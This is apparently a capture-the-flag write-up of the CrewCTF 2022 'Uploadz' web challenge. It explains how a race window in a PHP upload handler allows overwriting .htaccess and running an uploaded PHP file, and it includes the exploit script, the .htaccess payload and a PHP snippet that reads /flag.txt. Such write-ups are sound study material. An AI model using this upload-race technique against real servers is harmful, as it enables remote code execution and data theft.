# Web - Uploadz

## Challenge

I think this site safe from upload file, prove me wrong please.
https://uploadz-web.crewctf-2022.crewc.tf/

## First observations and ideas

The given website prompts you with a simple upload form. There are almost no upload restrictions in place.

To start off I took a quick look at the source code.
A few things are apparent from the first look:

- The server is running apache2
- It uses PHP as the preprocessing language

I started tampering around with the upload form using Burp Suite, but my first idea of using file name path traversal was quickly annihilated by line 29 in the source code.

```php
$fileName = basename($_FILES['uploadedFile']['name']);
```

The `basename` function prevents any kind of filename traversal in this case.

Executing previously uploaded `.php` files was also prevented by the .htaccess in the root folder, which renders the index file if a file ending with `.php` is viewed.

```js
    RewriteCond %{REQUEST_FILENAME} -f
    RewriteCond %{REQUEST_FILENAME} \.php$
    RewriteRule !^index.php index.php [L,NC]
```

Renaming the file to `.php5`, `.pHp`, `...` also didn't work.

## Forming the solution

To get a better understanding of the code I cleaned it up and gave the variables describing names.

```php
<?php

// Uninteresting
  function gen_uuid($length=6) {
    $keys = array_merge(range('a', 'z'), range('A', 'Z'));
    for($i=0; $i < $length; $i++) {
      $key .= $keys[array_rand($keys)];

    }

    return $key;
  }

  function copyToTempFolder($phpTempPath,$basenamedUploadedFileName){
     $filepathInTempFolder = "storage/app/temp/".$basenamedUploadedFileName;
     copy($phpTempPath,$filepathInTempFolder);

     return $filepathInTempFolder;
   }

  function moveToUploadsFolder($filepathInTempFolder,$basenamedUploadedFileName){
    $uuid = gen_uuid();
    $destination = "storage/app/uploads/".$uuid.$basenamedUploadedFileName;

    copy($filepathInTempFolder,$destination);

    // This is interesting
    sleep(1); // for loadblance and anti brute
    unlink($filepathInTempFolder);

    return $destination;
  }

  if (isset($_FILES['uploadedFile']))
  {
    $phpTempPath = $_FILES['uploadedFile']['tmp_name'];
    // This prevents Directory Traversal :(
    $basenamedUploadedFileName = basename($_FILES['uploadedFile']['name']);

    // This is not necessary - Interesting :)
    $filepathInTempFolder = copyToTempFolder($phpTempPath, $basenamedUploadedFileName);

    $filepathInUploadsFolder = moveToUploadsFolder($filepathInTempFolder,$basenamedUploadedFileName);

    echo "your file in ".$filepathInUploadsFolder;
  }

?>

<!-- HTML STUFF -->
<form action="/" method="post" enctype="multipart/form-data">
Select image to upload: <input type="file" name="uploadedFile" id="fileToUpload">
<input type="submit" value="Upload Image" name="submit"> </form>
```

The `copyToTempFolder` function seemed very suspicious to me, so I took a closer look at it. It copies the uploaded file from the default PHP temp directory to a separate public `/temp` directory. The file in the public `/temp` directory is deleted after one second. Interestingly enough, the filename in this directory is defined by the user, while the filename in the public `/uploads` directory gets prefixed with a random UUID. This means, that I can tamper with the filename in the public `/temp` folder.

After some time, I came up with the idea of overwriting the `.htaccess` in the `/temp` directory. This would allow me to execute PHP scripts for a time frame of one second in it.

I crafted a new `.htaccess` file, which would allow me to execute files ending with `.pwn` as PHP files.

### .htaccess

```
AddType application/x-httpd-php .pwn
```

Then I wrote a script to perform the exploit, as the time interval of one second was too short to perform the exploit by hand (Also coding is more fun).

The plan was to

- Upload the .htaccess overwrite
- Upload the PHP payload as a .pwn file
- Execute the payload
- Retrieve the data from the payload

### index.ts

```ts
import axios from 'axios';
import FormData from 'form-data';
import fs from 'fs';

const baseUrl = 'https://uploadz-web.crewctf-2022.crewc.tf';
const tempPath = 'storage/app/temp';
const exploits = {
  htaccess: { path: 'pwn/.htaccess', name: '.htaccess' },
  payload: { path: 'pwn/main.pwn', name: 'main.pwn' },
};

// Upload .htaccess Overwrite
const overwriteConfigFile = async () => {
  const form = new FormData();

  const htaccess = fs.readFileSync(exploits.htaccess.path);
  form.append('uploadedFile', htaccess, exploits.htaccess.name);

  axios.post(baseUrl, form.getBuffer(), {
    headers: {
      ...{
        'User-Agent':
          'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
      },
      ...form.getHeaders(),
    },
  });
};

// Upload Payload
const uploadPayload = async () => {
  const form = new FormData();

  const exploit = fs.readFileSync(exploits.payload.path);
  form.append('uploadedFile', exploit, exploits.payload.name);

  axios.post(baseUrl, form.getBuffer(), {
    headers: {
      ...{
        'User-Agent':
          'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
      },
      ...form.getHeaders(),
    },
  });
};

// Execute Payload
const executePayload = async () => {
  const payloadResponse = await (
    await axios.get(`${baseUrl}/${tempPath}/${exploits.payload.name}`)
  ).data;

  return payloadResponse;
};

const main = async () => {
  // Schedule
  overwriteConfigFile();
  uploadPayload();
  setTimeout(async () => {
    const response = await executePayload();
    console.log(response);
  }, 500);
};

main();
```

### main.pwn

```php
<?php

var_dump(glob("/*"));
var_dump(file_get_contents("/flag.txt"));

?>
```

## Extracting the flag

And sure enough, I could execute my payload as a PHP script and retrieve the flag from the root directory of the web server.

```
array(21) {
  [0]=>
  string(4) "/bin"
  [1]=>
  string(5) "/boot"
  [2]=>
  string(4) "/dev"
  [3]=>
  string(4) "/etc"
  [4]=>
  string(9) "/flag.txt"
  [5]=>
  string(5) "/home"
  [6]=>
  string(5) "/kctf"
  [7]=>
  string(4) "/lib"
  [8]=>
  string(6) "/lib64"
  [9]=>
  string(6) "/media"
  [10]=>
  string(4) "/mnt"
  [11]=>
  string(4) "/opt"
  [12]=>
  string(5) "/proc"
  [13]=>
  string(5) "/root"
  [14]=>
  string(4) "/run"
  [15]=>
  string(5) "/sbin"
  [16]=>
  string(4) "/srv"
  [17]=>
  string(4) "/sys"
  [18]=>
  string(4) "/tmp"
  [19]=>
  string(4) "/usr"
  [20]=>
  string(4) "/var"
}
string(28) "crewctf{upload_rce_via_race}"
```

The flag was `crewctf{upload_rce_via_race}` !

#

🚀 © Copyright 2022 - [@choozn](https://choozn.dev)
